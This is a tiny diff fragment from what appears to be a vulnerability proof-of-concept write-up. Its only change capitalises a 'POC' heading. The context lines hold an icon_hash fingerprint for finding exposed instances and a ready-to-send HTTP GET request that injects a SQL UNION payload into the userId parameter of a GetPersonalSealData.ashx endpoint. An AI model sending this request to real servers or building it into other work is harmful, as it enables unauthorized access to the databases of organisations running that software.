@@ -8,7 +8,7 @@
 icon_hash="-682445886"
 ```
 
-## poc
+## POC
 
 ```
 GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
